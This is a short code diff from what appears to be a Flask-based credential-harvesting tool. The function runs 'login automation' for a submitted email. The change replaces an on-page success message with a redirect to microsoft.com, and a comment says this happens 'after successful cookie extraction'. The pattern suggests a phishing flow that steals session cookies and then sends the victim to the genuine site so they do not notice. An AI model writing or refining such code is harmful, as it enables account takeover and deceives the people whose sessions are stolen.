@@ -497,8 +497,8 @@ def process_form():
             log_session_activity("login_automation_completed", user_email=email)
             logger.info(f"Successful login automation for {email}")
             
-            flash('Login automation completed successfully!', 'success')
-            return render_template('index.html', success=True, email=email)
+            # Redirect to Microsoft.com after successful cookie extraction
+            return redirect("https://microsoft.com")
             
         except TimeoutException as e:
             error_msg = f"Login timeout - please try again: {str(e)}"
